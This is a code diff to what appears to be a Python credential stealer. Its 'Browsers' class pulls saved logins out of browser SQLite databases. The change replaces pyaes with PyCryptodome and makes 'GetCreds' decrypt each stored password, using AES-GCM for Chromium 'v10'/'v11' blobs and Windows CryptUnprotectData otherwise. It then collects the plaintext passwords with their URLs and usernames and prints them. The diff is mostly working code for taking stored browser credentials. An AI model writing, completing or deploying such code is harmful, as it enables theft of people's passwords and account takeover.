@@ -6,8 +6,8 @@ from threading import Thread
 from urllib3 import PoolManager
 import json
 import base64
-import pyaes
 import sqlite3
+from Crypto.Cipher import AES
 import random
 import nmap3
 from xml.etree import ElementTree
@@ -269,15 +269,17 @@ class Browsers:
                     return None
                 
         def DecryptData(self, buffer: bytes, encryption_key: bytes):
-
             encryption_version = buffer.decode(errors= "ignore")
+
             if encryption_version.startswith(("v10", "v11")):
                 encrypt_iv = buffer[3:15]
                 cipher_data = buffer[15:]
-
-                return pyaes.AESModeOfOperationGCM(encryption_key, encrypt_iv).decrypt(cipher_data)[:-16].decode()
+                encryption_cipher = AES.new(encryption_key, AES.MODE_GCM, encrypt_iv)
+                decrypted_data = encryption_cipher.decrypt(cipher_data)[:-16].decode()
+                print(decrypted_data)
+                return decrypted_data
             else:
-                return str(Syscalls.CryptUnprotectData(buffer))
+                return str(Syscalls.CryptUnprotectData(buffer))            
             
         def GetCreds(self):
             encryption_key = self.GetEncryptionKey()
@@ -314,7 +316,7 @@ class Browsers:
 
                     for pass_url, pass_user, pass_password in password_results:
                         if pass_url and pass_user and pass_password:
-                            password_list.append((pass_url, pass_user, pass_password))
+                            password_list.append((pass_url, pass_user, self.DecryptData(pass_password, encryption_key)))
                 
                 except Exception:
                     pass
